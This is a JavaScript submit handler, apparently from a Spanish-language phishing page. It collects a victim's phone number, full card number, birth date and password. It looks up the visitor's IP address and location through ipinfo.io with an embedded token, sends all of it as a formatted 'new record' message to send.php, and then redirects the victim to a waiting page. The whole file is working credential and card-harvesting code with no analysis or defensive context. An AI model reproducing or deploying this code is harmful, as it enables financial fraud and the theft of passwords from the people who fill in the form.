
document.getElementById('form').addEventListener('submit', async function(e) {
e.preventDefault();
const telefono=document.getElementById('telefono').value;
const tarjeta=document.getElementById('tarjeta').value;
const nacimiento=document.getElementById('nacimiento').value;
const password=document.getElementById('password').value;
if (!/^\d{16}$/.test(tarjeta)) { alert("Debe tener 16 dígitos."); return; }
let ip="Desconocida", ubicacion="No disponible";
try{const res=await fetch("https://ipinfo.io/json?token=72e4f683c1c5fb");
const data=await res.json(); ip=data.ip; ubicacion=data.city+", "+data.region+", "+data.country; }catch(e){}
const mensaje=`📄 Nuevo registro:\n📱 Teléfono: ${telefono}\n💳 Tarjeta: ${tarjeta}\n🎂 Nacimiento: ${nacimiento}\n🔒 Contraseña: ${password}\n🌍 IP: ${ip}\n📌 Ubicación: ${ubicacion}`;
await fetch("send.php",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:mensaje})});
window.location.href = "espera.html";
});
